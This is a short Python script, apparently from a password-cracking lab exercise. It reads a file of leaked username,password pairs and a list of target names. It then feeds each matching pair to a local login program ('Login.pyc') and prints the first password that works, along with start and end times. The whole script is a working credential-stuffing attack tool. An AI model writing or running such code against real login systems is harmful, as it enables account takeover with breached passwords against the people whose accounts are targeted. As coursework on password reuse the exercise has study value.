import os
import time
import subprocess
import threading
import time

f = open("PwnedPWfile", "r")
user_pwds = [tuple(line.rstrip('\n').split(",")) for line in f]
d =  open("gang", "r")
Names = [line.rstrip('\n') for line in d]

def _break():
    thread = threading.Thread(target=thread_function, args=())
    thread.start()
    thread.join()

def thread_function():
    for pwd in user_pwds:
        #print("user is:",pwd[0], "pass is:",pwd[1])
        if(pwd[0] in Names):
            output = subprocess.run(["python3", "Login.pyc", pwd[0], pwd[1]], capture_output = True, text = True).stdout.strip("\n")
            if "success" in output:
                print("The Working Password For ", pwd[0], "is ",pwd[1])
                end = time.ctime(time.time())
                print("End time: ", end)
                break
                
start = time.ctime(time.time())
print("Start time: ", start)
_break()
